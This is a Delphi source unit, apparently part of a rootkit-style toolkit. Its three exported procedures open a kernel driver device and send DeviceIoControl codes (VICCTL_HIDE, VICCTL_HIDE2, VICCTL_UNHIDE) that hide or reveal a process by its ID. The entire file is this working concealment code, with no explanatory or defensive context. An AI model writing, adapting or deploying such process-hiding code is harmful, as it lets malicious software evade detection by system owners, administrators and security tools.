unit Mdl_HideProcess;

interface

uses Windows, Mdl_SomeFunction, Mdl_ConstVariable;

Procedure VIC_Hide(PID: DWord); stdcall;
Procedure VIC_UnHide(PID: DWord); stdcall;
Procedure VIC_Hide2(PID: DWord); stdcall;

implementation

uses mrVic;

Procedure VIC_Hide(PID: DWord); stdcall;
begin
  hDev:= CreateFileA(
    StrToPac('\\.\' + Copy(nFile,1,Length(nFile) - 4)),
    GENERIC_READ + GENERIC_WRITE,
    0,
    NIL,
    OPEN_EXISTING,
    0,
    0);
  if (hDev = INVALID_HANDLE_VALUE) then Exit;
  try
    inBuf:= PID;
    IoSucc:= DeviceIoControl(
      hDev,
      VICCTL_HIDE,
      @inBuf,
      SizeOf(inBuf),
      @outBuf,
      SizeOf(outBuf),
      dwReturned,
      NIL);
    CloseHandle(hDev);
  except
    CloseHandle(hDev);
  end;
end;

Procedure VIC_UnHide(PID: DWord); stdcall;
begin
  hDev:= CreateFileA(
    StrToPac('\\.\' + Copy(nFile,1,Length(nFile) - 4)),
    GENERIC_READ + GENERIC_WRITE,
    0,
    NIL,
    OPEN_EXISTING,
    0,
    0);
  if (hDev = INVALID_HANDLE_VALUE) then Exit;
  try
    inBuf:= PID;
    IoSucc:= DeviceIoControl(
      hDev,
      VICCTL_UNHIDE,
      @inBuf,
      SizeOf(inBuf),
      @outBuf,
      SizeOf(outBuf),
      dwReturned,
      NIL);
    CloseHandle(hDev);
  except
    CloseHandle(hDev);
  end;
end;

Procedure VIC_Hide2(PID: DWord); stdcall;
begin
  hDev:= CreateFileA(
    StrToPac('\\.\' + Copy(nFile,1,Length(nFile) - 4)),
    GENERIC_READ + GENERIC_WRITE,
    0,NIL,OPEN_EXISTING,0,0);
  if (hDev = INVALID_HANDLE_VALUE) then Exit;
  try
    inBuf:= PID;
    IoSucc:= DeviceIoControl(
      hDev,
      VICCTL_HIDE2,
      @inBuf,
      SizeOf(inBuf),
      @outBuf,
      SizeOf(outBuf),
      dwReturned,
      NIL);
    CloseHandle(hDev);
  except
    CloseHandle(hDev);
  end;
end;

end.
